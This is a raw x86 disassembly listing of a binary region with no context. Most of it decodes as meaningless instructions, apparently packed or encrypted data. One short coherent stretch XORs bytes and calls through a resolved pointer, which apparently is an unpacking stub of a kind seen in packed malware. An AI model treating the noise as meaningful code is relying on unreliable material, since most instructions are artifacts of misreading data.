  403127:	jmp    0x1bb7:0x70a4e0ee
  40312e:	test   al,0x58
  403131:	out    0x16,al
  403133:	in     al,0x81
  403135:	mov    al,ds:0xa43f8fa0
  40313a:	daa    
  40313b:	mov    al,0xc0
  40313d:	lods   al,BYTE PTR ds:[esi]
  40313e:	popa   
  40313f:	fs pop ebx
  403141:	out    dx,al
  403142:	or     DWORD PTR [esi-0x53eca4e1],edi
  403148:	xor    BYTE PTR [esi],0xc8
  40314b:	mov    ah,al
  40314d:	data16 xor cl,cl
  403150:	cmp    ch,BYTE PTR [ecx+0x43901a7d]
  403156:	test   eax,0x1c67819e
  40315b:	jmp    0x4030e0
  40315d:	rcr    BYTE PTR [eax-0x28],1
  403160:	retf   
  403161:	mov    ch,dl
  403163:	inc    eax
  403164:	mov    dl,0xbd
  403166:	rcl    BYTE PTR [eax+0x3bf98f31],0x77
  40316d:	test   DWORD PTR [ecx+0x32dcd374],ecx
  403173:	pop    es
  403174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403175:	mov    ebp,0xbbf30e8c
  40317a:	sub    DWORD PTR [eax-0x47],eax
  40317d:	cmp    eax,0x6fadf0a4
  403182:	mov    edi,0x2763d062
  403187:	and    ebx,DWORD PTR es:[ebp+0xe]
  40318b:	inc    ecx
  40318c:	inc    ebp
  40318d:	xor    edx,ebp
  40318f:	xlat   BYTE PTR ds:[ebx]
  403190:	pop    esi
  403191:	sub    eax,edx
  403193:	mov    al,0xfb
  403195:	jecxz  0x4031c4
  403197:	mov    dh,0xaf
  403199:	xlat   BYTE PTR ds:[ebx]
  40319a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40319b:	test   BYTE PTR [ebp+0x2330a863],ah
  4031a1:	shl    bh,cl
  4031a3:	retf   0x7c8d
  4031a6:	mov    ecx,0x36d62807
  4031ab:	sti    
  4031ac:	cmp    edx,edx
  4031ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031af:	adc    al,0x11
  4031b1:	in     al,0x59
  4031b3:	(bad)  
  4031b4:	call   0x1365:0xbdc11cf0
  4031bb:	inc    esi
  4031bc:	test   al,0xcb
  4031be:	pushf  
  4031bf:	inc    edx
  4031c0:	sub    ecx,esp
  4031c2:	mov    edx,0x2e47a1a4
  4031c7:	sub    dh,bl
  4031c9:	inc    ebx
  4031ca:	loopne 0x40315a
  4031cc:	dec    esi
  4031cd:	sbb    BYTE PTR [eax+0x41],ah
  4031d0:	cs out 0x12,al
  4031d3:	test   al,0x53
  4031d5:	aaa    
  4031d6:	je     0x40323c
  4031d8:	mov    BYTE PTR [ecx+0x2710cb10],0x73
  4031df:	add    dl,ah
  4031e1:	pop    esp
  4031e2:	push   es
  4031e3:	push   es
  4031e4:	pop    ecx
  4031e5:	cmp    BYTE PTR [esi],dl
  4031e7:	test   al,0x2f
  4031e9:	sub    ebx,edi
  4031eb:	or     al,0x19
  4031ed:	sbb    eax,0xd95a5f5
  4031f2:	sahf   
  4031f3:	cld    
  4031f4:	fs enter 0xd29f,0x91
  4031f9:	or     DWORD PTR [ecx+0x7c],esp
  4031fc:	lods   al,BYTE PTR ds:[esi]
  4031fd:	loop   0x40324d
  4031ff:	push   eax
  403200:	xchg   DWORD PTR [edx],ebx
  403202:	sbb    DWORD PTR [eax],edx
  403204:	push   esp
  403205:	adc    esi,DWORD PTR [edx]
  403207:	xchg   edi,eax
  403208:	cwde   
  403209:	mov    ebx,0x8ec6a0e6
  40320e:	outs   dx,DWORD PTR ds:[esi]
  40320f:	push   edx
  403210:	fidivr WORD PTR [edx]
  403212:	call   0xc513:0xf873bf4b
  403219:	mov    BYTE PTR [edx],bh
  40321b:	fs ins BYTE PTR es:[edi],dx
  40321d:	shr    DWORD PTR [esi-0x4c],0x64
  403221:	bound  ebx,QWORD PTR ds:0xb7402533
  403227:	popf   
  403228:	xchg   DWORD PTR [eax-0x1a61a659],edx
  40322e:	sbb    eax,0x4d19fe42
  403233:	enter  0x62c5,0xf4
  403237:	xchg   esi,eax
  403238:	ins    DWORD PTR es:[edi],dx
  403239:	neg    DWORD PTR [edi+0xd]
  40323c:	lds    edi,FWORD PTR [di]
  40323f:	push   edi
  403240:	fxch   st(7)
  403242:	sub    BYTE PTR [eax+0x37],dl
  403245:	push   esi
  403246:	or     al,cl
  403248:	or     al,0xe3
  40324a:	pusha  
  40324b:	lahf   
  40324c:	cld    
  40324d:	(bad)  [ebp+0x9]
  403250:	shl    BYTE PTR [esp+edx*4],cl
  403253:	dec    eax
  403254:	fisttp DWORD PTR [esi+0x1b382a72]
  40325a:	arpl   WORD PTR [ebp-0x3e],cx
  40325d:	push   es
  40325e:	mov    al,0xf
  403260:	sbb    al,BYTE PTR [esi+eiz*2-0x29]
  403264:	mov    cs,esp
  403266:	clc    
  403267:	push   0xffffff84
  403269:	enter  0x3c8f,0xcb
  40326d:	cdq    
  40326e:	mov    ebx,0x67baeb8a
  403273:	fld    TBYTE PTR [edi]
  403275:	aas    
  403276:	cdq    
  403277:	cdq    
  403278:	push   es
  403279:	les    esi,FWORD PTR [edx+eax*4]
  40327c:	and    eax,0x931e19d8
  403281:	mov    al,0xfe
  403283:	sub    eax,0x2471bcc1
  403288:	fld    QWORD PTR [edi]
  40328a:	rcl    BYTE PTR [ebx-0xd],0x74
  40328e:	repnz test BYTE PTR [ecx+0x16],cl
  403292:	sbb    al,0xd9
  403294:	fst    QWORD PTR [edi+ebx*4-0x4056271a]
  40329b:	rcr    DWORD PTR [eax+ecx*4],0xfc
  40329f:	xor    ah,ah
  4032a1:	shl    DWORD PTR [ecx],cl
  4032a3:	push   ebp
  4032a4:	or     al,0x2
  4032a6:	jmp    0x989d51fb
  4032ab:	test   BYTE PTR [ebx],al
  4032ad:	xlat   BYTE PTR ds:[ebx]
  4032ae:	mov    ds:0x4ab5ab42,eax
  4032b3:	cmp    al,0xf2
  4032b5:	cmp    eax,0x512aa644
  4032ba:	and    al,0x21
  4032bc:	mov    WORD PTR [edi],es
  4032be:	daa    
  4032bf:	mov    ebx,0x29d1f79b
  4032c4:	outs   dx,BYTE PTR ds:[esi]
  4032c5:	and    cl,bh
  4032c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032c8:	fwait
  4032c9:	les    eax,FWORD PTR [esi+ebx*1]
  4032cc:	jbe    0x40327a
  4032ce:	fstp   QWORD PTR [esi+eax*4+0x685acc31]
  4032d5:	or     al,dh
  4032d7:	and    BYTE PTR [esi-0x748c2502],0xa2
  4032de:	(bad)  
  4032df:	addr16 mov bl,0xf
  4032e2:	push   esi
  4032e3:	xchg   ecx,eax
  4032e4:	xor    eax,0x47ba18ad
  4032e9:	shl    cl,0xbc
  4032ec:	push   ds
  4032ed:	sahf   
  4032ee:	cs push 0x7242cb86
  4032f4:	xor    BYTE PTR [edx-0x75],bl
  4032f7:	mov    al,0x0
  4032f9:	jno    0x403337
  4032fb:	cdq    
  4032fc:	jns    0x403351
  4032fe:	(bad)  
  4032ff:	jns    0x40330e
  403301:	push   ebp
  403302:	jle    0x4032ca
  403304:	ins    DWORD PTR es:[edi],dx
  403305:	adc    eax,0xf0a40682
  40330a:	call   0x96891a7f
  40330f:	xor    DWORD PTR [esi],edx
  403311:	add    al,0x6d
  403313:	adc    BYTE PTR [esi+0x7b1ab622],bh
  403319:	mov    ecx,DWORD PTR [edx+0x1b]
  40331c:	pcmpeqw mm3,mm1
  40331f:	cmp    DWORD PTR [esi+0x1],ecx
  403322:	test   DWORD PTR [ecx],ebx
  403324:	cmp    ah,BYTE PTR [ebx+0x2c]
  403327:	enter  0x7615,0xae
  40332b:	jnp    0x403326
  40332d:	cs xchg edi,eax
  40332f:	in     al,dx
  403330:	in     al,dx
  403331:	rol    DWORD PTR [si+0x2f],1
  403335:	not    DWORD PTR [ebp+0x531c649f]
  40333b:	loop   0x403329
  40333d:	test   BYTE PTR [ecx-0x454cffb7],0xc5
  403344:	dec    ebp
  403345:	pop    es
  403346:	inc    esi
  403347:	fidiv  DWORD PTR [ebp+0x2ccc7a0e]
  40334d:	mov    dl,0xe2
  40334f:	add    DWORD PTR ds:0x96cc3eeb,esi
  403355:	sub    al,0x5a
  403357:	inc    edx
  403358:	call   0xbea5:0x4d0e14b3
  40335f:	sbb    eax,0xbd0d1ba
  403364:	les    edi,FWORD PTR [edx+0x730156ea]
  40336a:	sub    al,0x2c
  40336c:	mov    dl,0xe1
  40336e:	fs in  eax,dx
  403370:	jno    0x4033d2
  403372:	frstor [ebx+0x503adac]
  403378:	inc    edi
  403379:	inc    ebp
  40337a:	jnp    0x403387
  40337c:	inc    esp
  40337d:	pop    ebp
  40337e:	and    BYTE PTR [ebx+0x1b1b471b],0x6c
  403385:	mov    esi,0xccea6bfb
  40338a:	xabort 0xd1
  40338d:	jmp    0x403328
  40338f:	mov    ds:0x219e4539,al
  403394:	mov    bl,0x69
  403396:	mov    ecx,0x40104c7
  40339b:	(bad)  
  40339c:	mov    ch,0x17
  40339e:	add    dh,BYTE PTR ds:0x726ceec
  4033a4:	adc    eax,0xb8fc2521
  4033a9:	scas   al,BYTE PTR es:[edi]
  4033aa:	mov    WORD PTR [edx+0xb],cs
  4033ad:	daa    
  4033ae:	sti    
  4033af:	fisttp WORD PTR ds:0x97d675a3
  4033b5:	shl    ecx,0x33
  4033b8:	pop    ebx
  4033b9:	stc    
  4033ba:	xor    ecx,DWORD PTR [eax-0xd74f52f]
  4033c0:	and    BYTE PTR [ebx],ch
  4033c2:	in     eax,dx
  4033c3:	mov    eax,0xbddfadb8
  4033c8:	leave  
  4033c9:	pop    esi
  4033ca:	or     eax,0x336f46d6
  4033d0:	and    bl,bl
  4033d2:	je     0x40342e
  4033d4:	ret    0x8b59
  4033d7:	fisubr WORD PTR [edx+0x3b]
  4033da:	add    BYTE PTR [edx],al
  4033dc:	pop    eax
  4033dd:	inc    ebp
  4033de:	sub    DWORD PTR [ecx-0x4086a40c],0x26
  4033e5:	xor    bh,bh
  4033e7:	fisubr DWORD PTR [esi-0x66]
  4033ea:	mov    esp,0x71f57f86
  4033ef:	pop    es
  4033f0:	push   ebx
  4033f1:	cmp    eax,0x3aca2353
  4033f6:	in     eax,dx
  4033f7:	mov    dl,0xba
  4033f9:	das    
  4033fa:	je     0x4033d5
  4033fc:	gs dec esp
  4033fe:	sbb    al,0x4c
  403400:	add    edi,esp
  403402:	dec    esi
  403403:	adc    bh,BYTE PTR [ebx+0x65]
  403406:	popf   
  403407:	fsubr  QWORD PTR [esi+0x96b054a]
  40340d:	adc    al,0xb8
  40340f:	scas   al,BYTE PTR es:[edi]
  403410:	(bad)  
  403411:	ss in  eax,0x64
  403414:	lods   eax,DWORD PTR ds:[esi]
  403415:	sbb    ebp,ecx
  403417:	rcl    BYTE PTR [ecx-0x1d721ba5],cl
  40341d:	cmp    eax,0x65ef7a65
  403422:	arpl   dx,ax
  403424:	jne    0x4033ec
  403426:	pop    esi
  403427:	xlat   BYTE PTR ds:[ebx]
  403428:	add    al,0x5c
  40342a:	or     esp,edx
  40342c:	push   0x4c
  40342e:	xor    ebx,DWORD PTR [edx-0x7ddb0199]
  403434:	inc    ebp
  403435:	sbb    ebx,ebp
  403437:	adc    eax,0x1153c8b7
  40343c:	push   eax
  40343d:	ja     0x403445
  40343f:	lea    ebx,[eax+0x10]
  403442:	push   esp
  403443:	adc    eax,0x450b24b3
  403448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403449:	imul   ebp,edx,0xffffffc1
  40344c:	xchg   BYTE PTR [esi-0x5b07465d],al
  403452:	leave  
  403453:	enter  0xc24c,0xc8
  403457:	mov    edi,0x81e26757
  40345c:	aad    0x84
  40345e:	xchg   edx,eax
  40345f:	inc    esp
  403460:	push   ds
  403461:	mov    ah,0x3
  403463:	fcomip st,st(2)
  403465:	push   ebp
  403466:	sbb    DWORD PTR [ebx+0x223bc811],0xbfb37592
  403470:	call   0xef602d53
  403475:	mov    esi,0x37f5e871
  40347a:	imul   ebp,DWORD PTR [esi],0x87be99e1
  403480:	addr16 out dx,al
  403482:	dec    edx
  403483:	jnp    0x4034a2
  403485:	cmc    
  403486:	not    esp
  403488:	jnp    0x403504
  40348a:	mov    esp,0xb4571635
  40348f:	in     eax,0x7b
  403491:	pop    ss
  403492:	or     BYTE PTR [esi],ch
  403494:	sub    dl,ah
  403496:	xchg   esp,eax
  403497:	ins    DWORD PTR es:[edi],dx
  403498:	inc    ecx
  403499:	jmp    0xc88d787c
  40349e:	dec    esp
  40349f:	aad    0x4
  4034a1:	mov    ecx,0x3600f3d7
  4034a6:	push   esi
  4034a7:	call   0x7c00:0x356b3526
  4034ae:	aaa    
  4034af:	jb     0x4034ca
  4034b1:	mov    dh,0x5a
  4034b3:	sbb    BYTE PTR [eax+0xb],0xd0
  4034b7:	mov    esi,0xa7607314
  4034bc:	shr    DWORD PTR [edx-0x71],cl
  4034bf:	test   BYTE PTR [ecx+eax*4+0x40],0x4a
  4034c4:	das    
  4034c5:	adc    al,0x86
  4034c7:	add    BYTE PTR [ebx+0x6e],bl
  4034ca:	dec    eax
  4034cb:	jno    0x403454
  4034cd:	cmp    al,0x38
  4034cf:	sub    BYTE PTR [ecx],al
  4034d1:	or     esp,DWORD PTR [edi]
  4034d3:	pop    ebx
  4034d4:	rcl    cl,0x6a
  4034d7:	xchg   bl,bl
  4034d9:	leave  
  4034da:	pusha  
  4034db:	mov    eax,ds:0x8a9385a7
  4034e0:	push   cs
  4034e1:	mov    bh,ch
  4034e3:	mov    al,0xd0
  4034e5:	xor    esi,eax
  4034e7:	xchg   esp,eax
  4034e8:	inc    ebx
  4034e9:	add    ch,BYTE PTR [edx]
  4034eb:	or     DWORD PTR [edx+esi*8-0x1],esp
  4034ef:	shl    DWORD PTR [ecx+ebp*4],0x3
  4034f3:	and    al,0x5a
  4034f5:	leave  
  4034f6:	cld    
  4034f7:	push   ebp
  4034f8:	sbb    ecx,DWORD PTR [edx-0x3]
  4034fb:	or     BYTE PTR [edx+0x74],dl
  4034fe:	mov    eax,ds:0x4a0ce21a
  403503:	dec    esi
  403504:	ret    
  403505:	and    al,0x47
  403507:	dec    edi
  403508:	jnp    0x4034dc
  40350a:	mov    ch,BYTE PTR [eax]
  40350c:	lods   eax,DWORD PTR ds:[esi]
  40350d:	pop    esi
  40350e:	out    0x1a,eax
  403510:	push   edi
  403511:	mov    ds:0xffae6f0a,eax
  403516:	aad    0xe5
  403518:	sbb    ebp,DWORD PTR [ecx]
  40351a:	(bad)  
  40351b:	cli    
  40351c:	xlat   BYTE PTR ds:[ebx]
  40351d:	addr16 adc al,0xf6
  403520:	and    BYTE PTR [edx],0xc1
  403523:	mov    eax,ds:0x24d6c57d
  403528:	push   ss
  403529:	mov    ebp,0xf0ef92c8
  40352e:	sub    eax,0x43c9bd9e
  403533:	arpl   WORD PTR [edi+ebp*8-0x56],bx
  403537:	dec    ecx
  403538:	mov    esi,0x15ff61e5
  40353d:	in     eax,0x22
  40353f:	sub    edi,0xe5786a9b
  403545:	xor    eax,ebp
  403547:	ret    0x5329
  40354a:	repnz loopne 0x40359b
  40354d:	xor    DWORD PTR [ecx-0x2ff2e4fb],0xa71bf17c
  403557:	faddp  st(4),st
  403559:	les    edi,FWORD PTR [edi-0x11]
  40355c:	in     eax,dx
  40355d:	cs into 
  40355f:	out    0x1e,eax
  403561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403562:	fwait
  403563:	cld    
  403564:	loopne 0x40355d
  403566:	loop   0x4034ef
  403568:	lahf   
  403569:	retf   
  40356a:	sub    DWORD PTR [edx],ebp
  40356c:	jb     0x403592
  40356e:	cld    
  40356f:	jge    0x403560
  403571:	shl    ebx,1
  403573:	ja     0x4035c3
  403575:	cld    
  403576:	or     dl,BYTE PTR [esi-0x4a]
  403579:	or     DWORD PTR [eax+0x2c945cef],eax
  40357f:	add    al,BYTE PTR [ecx+0x6f]
  403582:	adc    eax,DWORD PTR [edx]
  403584:	push   cs
  403585:	xchg   edi,eax
  403586:	shl    BYTE PTR [ebx],1
  403588:	int3   
  403589:	lods   al,BYTE PTR ds:[esi]
  40358a:	xchg   edx,eax
  40358b:	push   ds
  40358c:	(bad)  
  40358d:	mov    bh,0xa0
  40358f:	ins    BYTE PTR es:[edi],dx
  403590:	xlat   BYTE PTR ds:[ebx]
  403591:	adc    eax,0x577e77ef
  403596:	xchg   esp,eax
  403597:	scas   al,BYTE PTR es:[edi]
  403598:	pusha  
  403599:	mov    dh,0xa0
  40359b:	push   cs
  40359c:	xchg   ebp,eax
  40359d:	outs   dx,BYTE PTR ds:[esi]
  40359e:	lea    esi,[edi+esi*1]
  4035a1:	mov    bh,0x6d
  4035a3:	jns    0x403546
  4035a5:	add    BYTE PTR [edx],dl
  4035a7:	sub    al,0xe5
  4035a9:	data16 mov bh,BYTE PTR [eax+0x4b]
  4035ad:	pop    ss
  4035ae:	sahf   
  4035af:	adc    eax,0x39782a7f
  4035b4:	mov    al,0x5
  4035b6:	(bad)
  4035ba:	imul   ebp,ebp,0xebc664b7
  4035c0:	jl     0x40360b
  4035c2:	shl    DWORD PTR [eax+0x6f],0xe6
  4035c6:	ins    BYTE PTR es:[edi],dx
  4035c7:	pop    es
  4035c8:	push   es
  4035c9:	mov    ds:0xa1d586f5,eax
  4035ce:	push   ebx
  4035cf:	mov    al,ds:0xe7e36517
  4035d4:	jo     0x4035b7
  4035d6:	cld    
  4035d7:	mov    ds:0xbdc14ab8,al
  4035dc:	sbb    al,0xb
  4035de:	test   BYTE PTR [edx+0x782a8270],ah
  4035e4:	and    dh,bh
  4035e6:	(bad)
  4035e9:	mov    ecx,0x2c7bc42b
  4035ee:	out    dx,al
  4035ef:	xchg   edi,eax
  4035f0:	cmp    al,0x85
  4035f2:	mov    ch,0x9b
  4035f4:	clc    
  4035f5:	and    al,0x8a
  4035f7:	xor    dh,dh
  4035f9:	push   ecx
  4035fb:	les    eax,FWORD PTR [edx+0x78]
  4035fe:	fs mov edi,0x90f21309
  403604:	pop    ecx
  403605:	push   esi
  403606:	jb     0x403615
  403608:	xchg   ebp,eax
  403609:	pop    ecx
  40360a:	arpl   WORD PTR [ebx],bp
  40360c:	in     eax,dx
  40360d:	add    dh,BYTE PTR [ecx+0x3dc69fe3]
  403613:	pusha  
  403614:	sub    al,0x76
  403616:	out    dx,al
  403617:	not    esi
  403619:	or     BYTE PTR [ebx+0x7e2517a8],bh
  40361f:	pop    ecx
  403620:	jbe    0x403627
  403622:	or     ebp,esp
  403624:	push   eax
  403625:	out    0xd,al
  403627:	neg    BYTE PTR [edx]
  403629:	mov    dl,0xee
  40362b:	push   edi
  40362c:	inc    esp
  40362d:	in     al,dx
  40362e:	inc    edi
  40362f:	ss cmc 
  403631:	cmp    ah,BYTE PTR [ecx]
  403633:	mov    edi,0xdef5454c
  403638:	fldcw  WORD PTR [edi-0x4b07cbf0]
  40363e:	(bad)  
  40363f:	aam    0x16
  403641:	mov    ebp,0x44b66098
  403646:	pop    ecx
  403647:	mov    fs,WORD PTR [esi-0x71]
  40364a:	mov    ebp,0x1462881f
  40364f:	xor    al,0xcc
  403651:	cmc    
  403652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403653:	mov    ebp,0x81500b79
  403658:	mov    ds:0xc12052cc,al
  40365d:	loope  0x403664
  40365f:	pop    esi
  403660:	jno    0x403627
  403662:	push   edx
  403663:	mov    ?,WORD PTR [ebx+0x5c0935e2]
  403669:	cmp    ebx,edi
  40366b:	dec    esp
  40366c:	xor    DWORD PTR [edx+0x364ab82e],eax
  403672:	mov    ecx,0x42461057
  403677:	fimul  DWORD PTR [edx]
  403679:	push   ebx
  40367a:	or     DWORD PTR [ecx+0x1bf08b52],0x4f
  403681:	mov    DWORD PTR [esi+0x6229315b],edx
  403687:	(bad)  
  40368a:	inc    ebp
  40368b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40368c:	pop    ebp
  40368d:	xchg   ebx,eax
  40368e:	jle    0x40363b
  403690:	ins    DWORD PTR es:[edi],dx
  403691:	xor    DWORD PTR [edi-0x4f],ebx
  403694:	mov    al,0x82
  403696:	mov    bh,dh
  403698:	inc    esp
  403699:	loope  0x403700
  40369b:	in     al,dx
  40369c:	cmc    
  40369d:	xchg   BYTE PTR [edx+0x5bc6c1e4],cl
  4036a3:	xchg   edi,eax
  4036a4:	dec    esp
  4036a5:	pop    edx
  4036a6:	inc    edi
  4036a7:	mov    bl,0xba
  4036a9:	imul   eax,DWORD PTR [eax+0x43b02a56],0x3d617ad4
  4036b3:	sub    dl,BYTE PTR [eax+edx*2-0x48]
  4036b7:	out    0x85,al
  4036b9:	das    
  4036ba:	adc    ebp,DWORD PTR [edi]
  4036bc:	retf   0x7400
  4036bf:	not    BYTE PTR [edi-0x63]
  4036c2:	mov    edx,0x62b0fd63
  4036c7:	loope  0x403715
  4036c9:	mov    dh,0x51
  4036cb:	pusha  
  4036cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036cd:	cwde   
  4036ce:	dec    eax
  4036cf:	sub    BYTE PTR [esi+0x3cd92813],dh
  4036d5:	pop    eax
  4036d6:	mov    eax,0xcf34e716
  4036db:	and    al,0x33
  4036dd:	cmp    edx,eax
  4036df:	pop    ss
  4036e0:	test   DWORD PTR [edx+0x7294e534],ebp
  4036e6:	scas   al,BYTE PTR es:[edi]
  4036e7:	or     eax,0x69d63744
  4036ec:	add    al,0x99
  4036ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036ef:	test   DWORD PTR [edi+0xaef638d],esp
  4036f5:	jecxz  0x403689
  4036f7:	imul   ebx,ebx,0x2d
  4036fa:	lods   al,BYTE PTR ds:[esi]
  4036fc:	xor    ah,BYTE PTR [edx-0x35]
  4036ff:	jns    0x4036ef
  403701:	in     eax,0xf7
  403703:	and    al,0xb1
  403705:	inc    BYTE PTR [edx-0x31]
  403708:	outs   dx,BYTE PTR ds:[esi]
  403709:	jg     0x40377b
  40370b:	mov    eax,ds:0x7a6cc085
  403710:	addr16 push ebx
  403712:	scas   al,BYTE PTR es:[edi]
  403713:	cmp    edx,DWORD PTR [ebx]
  403715:	adc    DWORD PTR [ebx-0x7b],ebx
  403718:	mov    eax,0x90fe5643
  40371d:	inc    edx
  40371e:	stc    
  40371f:	push   0xffffff8a
  403721:	pop    edi
  403722:	push   eax
  403723:	repz int3 
  403725:	dec    ecx
  403726:	in     eax,dx
  403727:	pop    ds
  403728:	pop    esi
  403729:	pop    esi
  40372a:	mov    cl,0xac
  40372c:	jo     0x403791
  40372e:	pusha  
  40372f:	(bad)  
  403730:	repz mov edx,0x53fb3a59
  403736:	pop    ss
  403737:	dec    edi
  403738:	jno    0x4036db
  40373a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40373b:	cld    
  40373c:	xchg   BYTE PTR [ebx-0x3d],ch
  40373f:	ins    DWORD PTR es:[edi],dx
  403740:	add    al,0x96
  403743:	in     eax,0x4d
  403745:	add    BYTE PTR [esi-0xa],bl
  403748:	lahf   
  403749:	pop    edi
  40374a:	(bad)  
  40374b:	mov    ds:0x11196e39,eax
  403750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403751:	and    DWORD PTR [ebx-0x18],0x24
  403755:	mov    edi,0x4c574343
  40375a:	xchg   edi,eax
  40375b:	xchg   DWORD PTR [ebp+0x6b1ba08e],edi
  403761:	out    dx,al
  403762:	jl     0x4036ec
  403764:	jbe    0x403747
  403766:	and    BYTE PTR [ebx],0xeb
  403769:	jns    0x4037e4
  40376b:	jno    0x403793
  40376d:	int3   
  40376e:	or     eax,0xacbd839
  403773:	fild   WORD PTR [ecx+0x7d]
  403776:	add    BYTE PTR [edx],ah
  403778:	or     eax,0x457ffea1
  40377d:	mov    DWORD PTR [ebp-0x47e6a52d],edx
  403783:	mov    bh,0xa7
  403785:	push   ebx
  403786:	out    dx,al
  403787:	lods   al,BYTE PTR ds:[esi]
  403788:	adc    eax,0xed70f178
  40378d:	mov    bh,0x83
  40378f:	pop    ecx
  403790:	mov    cl,0xf4
  403792:	mov    WORD PTR [ebx+0x138ea942],ds
  403798:	push   edi
  403799:	add    al,0x4b
  40379b:	sysexit 
  40379d:	test   eax,0x159a7fa6
  4037a2:	mov    ds:0x5a129ea7,al
  4037a7:	dec    DWORD PTR [ebx-0x35a1b26a]
  4037ad:	push   ds
  4037ae:	sub    eax,0xa63fa7b8
  4037b3:	fmul   DWORD PTR [esi]
  4037b5:	sub    ch,dh
  4037b7:	push   0x12
  4037b9:	arpl   WORD PTR [edi],sp
  4037bb:	push   ss
  4037bc:	ins    BYTE PTR es:[edi],dx
  4037bd:	push   ss
  4037be:	jbe    0x4037f6
  4037c0:	mov    dh,0xe4
  4037c2:	dec    eax
  4037c3:	or     DWORD PTR [ebx-0x6],ebp
  4037c6:	test   al,0xd2
  4037c8:	inc    edx
  4037c9:	daa    
  4037ca:	repz sar WORD PTR cs:[eax-0x5b3be0c],0x7d
  4037d4:	loopne 0x403821
  4037d6:	jne    0x40376d
  4037d8:	adc    eax,DWORD PTR [esi-0x4075ba7f]
  4037de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037df:	lds    edx,FWORD PTR [ebp-0x34]
  4037e2:	mov    eax,ds:0x7b4248cf
  4037e7:	sbb    DWORD PTR ds:0x376585ce,esi
  4037ed:	xor    al,0x99
  4037ef:	xchg   ecx,eax
  4037f0:	add    bl,BYTE PTR ds:0x7cb74c12
  4037f6:	outs   dx,BYTE PTR ds:[esi]
  4037f7:	retf   0x9922
  4037fa:	add    DWORD PTR [ecx],esp
  4037fc:	jno    0x4037c3
  4037fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ff:	repz rol esi,0xf4
  403803:	cmp    ah,BYTE PTR [eax]
  403805:	mov    esi,0x8dd83b41
  40380a:	retf   0x4840
  40380d:	sbb    ecx,ebx
  40380f:	test   BYTE PTR [edx],0x65
  403812:	push   0x24
  403814:	mov    cl,0xa
  403816:	mov    ebx,0xef02abb
  40381b:	sub    dh,ah
  40381d:	cli    
  40381e:	sbb    al,bh
  403820:	(bad)  
  403821:	jecxz  0x403812
  403823:	(bad)  
  403825:	hlt    
  403826:	push   0xffffff99
  403828:	push   0xb7a8b851
  40382d:	sbb    esi,DWORD PTR [edi+0x2a47e04]
  403833:	cwde   
  403834:	sub    bl,BYTE PTR [edi-0x45]
  403837:	scas   eax,DWORD PTR es:[edi]
  403838:	shr    DWORD PTR [ecx],0x1a
  40383b:	jl     0x403893
  40383d:	retf   
  40383e:	(bad)  
  40383f:	xor    BYTE PTR [ecx-0x9ff7cd7],ah
  403845:	stc    
  403846:	aaa    
  403847:	mov    cl,0x56
  403849:	inc    edi
  40384a:	in     al,0x4
  40384c:	call   0x99dc014c
  403851:	or     eax,0x450155a5
  403856:	hlt    
  403857:	mov    eax,DWORD PTR [ebp-0xc]
  40385a:	mov    ecx,DWORD PTR [ebp-0x8]
  40385d:	mov    ecx,DWORD PTR [ecx]
  40385f:	mov    ecx,DWORD PTR [ecx]
  403861:	mov    ecx,DWORD PTR [ecx]
  403863:	mov    DWORD PTR [ecx+0x1],eax
  403866:	mov    al,BYTE PTR [ebp-0x1]
  403869:	mov    ecx,DWORD PTR [ebp-0x8]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    ecx,DWORD PTR [ecx]
  403872:	push   DWORD PTR [ebp-0x2c]
  403875:	xor    al,0x6f
  403877:	sub    al,0xd
  403879:	mov    BYTE PTR [ecx],al
  40387b:	mov    eax,ds:0x42179e
  403880:	push   DWORD PTR [eax]
  403882:	push   DWORD PTR ds:0x4219fa
  403888:	push   DWORD PTR ds:0x4217a6
  40388e:	push   DWORD PTR ds:0x4219da
  403894:	push   DWORD PTR ds:0x421a6e
  40389a:	push   DWORD PTR [ebp-0x30]
  40389d:	push   DWORD PTR [ebp-0x20]
  4038a0:	mov    eax,DWORD PTR [ebp-0x8]
  4038a3:	mov    eax,DWORD PTR [eax]
  4038a5:	mov    eax,DWORD PTR [eax]
  4038a7:	mov    eax,DWORD PTR [eax]
  4038a9:	call   eax
  4038ab:	mov    eax,DWORD PTR [ebp-0x34]
  4038ae:	mov    ecx,DWORD PTR ds:0x42199e
  4038b4:	add    DWORD PTR [eax],ecx
  4038b6:	jmp    0x405c6b
  4038bb:	fnstenv [edx-0x73]
  4038be:	xchg   ebp,eax
  4038bf:	gs xchg ebp,eax
  4038c1:	test   eax,0x7c0e640e
  4038c6:	sbb    al,BYTE PTR [ebx-0x350eb45e]
  4038cc:	pop    edi
  4038cd:	bound  esp,QWORD PTR [edx-0x36]
  4038d0:	pop    edi
  4038d1:	bound  esp,QWORD PTR [edx-0x47]
  4038d4:	fild   WORD PTR [ecx+ebp*1]
  4038d7:	sub    eax,0x5d360bfb
  4038dc:	iret   
  4038dd:	adc    al,0xb7
  4038df:	leave  
  4038e0:	mov    esp,0xf40541c
  4038e5:	pop    edx
  4038e6:	xchg   ecx,eax
  4038e7:	xor    DWORD PTR [edi+0x142cacf7],ecx
  4038ed:	loop   0x40389d
  4038ef:	mov    ebp,0x59fb99b0
  4038f4:	pushf  
  4038f5:	cwde   
  4038f6:	cmp    al,0x36
  4038f8:	into   
  4038f9:	jmp    0x97ccfe5e
  4038fe:	jmp    0x414066af
  403903:	lea    edi,[ecx]
  403905:	sbb    edi,DWORD PTR [edx+0x6baff84a]
  40390b:	enter  0xa7f5,0xb7
  40390f:	call   0x84ea:0x4192312c
  403916:	(bad)  
  403918:	aad    0x2f
  40391a:	xlat   BYTE PTR ds:[ebx]
  40391b:	or     al,0x6a
